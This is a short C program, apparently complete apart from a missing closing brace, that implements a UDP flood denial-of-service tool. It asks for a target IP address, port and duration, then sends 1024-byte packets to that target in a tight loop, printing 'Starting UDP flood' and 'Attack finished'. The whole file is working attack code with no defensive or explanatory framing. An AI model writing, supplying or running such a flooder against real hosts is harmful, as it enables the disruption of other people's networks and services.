#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <time.h>
#include <unistd.h>

#define PACKET_SIZE 1024  // UDP packet size

int main() {
    char target_ip[100];
    int target_port, attack_time;
    
    // Get user input
    printf("Enter target IP: ");
    scanf("%s", target_ip);
    printf("Enter target port: ");
    scanf("%d", &target_port);
    printf("Enter attack duration (in seconds): ");
    scanf("%d", &attack_time);

    // Create UDP socket
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        return 1;
    }

    // Target address setup
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(target_port);
    target.sin_addr.s_addr = inet_addr(target_ip);

    // Create UDP packet data
    char packet[PACKET_SIZE];
    memset(packet, 'X', sizeof(packet));

    // Start attack
    printf("Starting UDP flood on %s:%d for %d seconds...\n", target_ip, target_port, attack_time);
    time_t start_time = time(NULL);

    while (time(NULL) - start_time < attack_time) {
        sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&target, sizeof(target));
    }

    printf("Attack finished.\n");
    close(sock);
    return 0;
